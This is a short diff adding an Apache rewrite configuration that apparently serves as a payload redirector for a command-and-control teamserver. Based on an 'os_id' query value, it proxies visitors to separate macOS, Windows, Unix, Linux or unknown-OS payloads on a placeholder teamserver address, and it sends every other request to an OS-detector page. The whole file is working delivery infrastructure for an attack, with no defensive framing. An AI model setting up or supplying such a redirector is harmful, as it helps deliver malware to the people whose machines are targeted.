@@ -1,0 +1,12 @@
+RewriteEngine On
+RewriteCond %{QUERY_STRING} os_id=mac
+RewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/MAC-OS-X-PAYLOAD [P]
+RewriteCond %{QUERY_STRING} os_id=windows
+RewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/WINDOWS-PAYLOAD [P]
+RewriteCond %{QUERY_STRING} os_id=unix
+RewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/UNIX-PAYLOAD [P]
+RewriteCond %{QUERY_STRING} os_id=linux
+RewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/LINUX-PAYLOAD [P]
+RewriteCond %{QUERY_STRING} os_id=unknown
+RewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/UNKNOWN-OS-PAYLOAD [P]
+RewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/OS-DETECTOR.HTML [P]
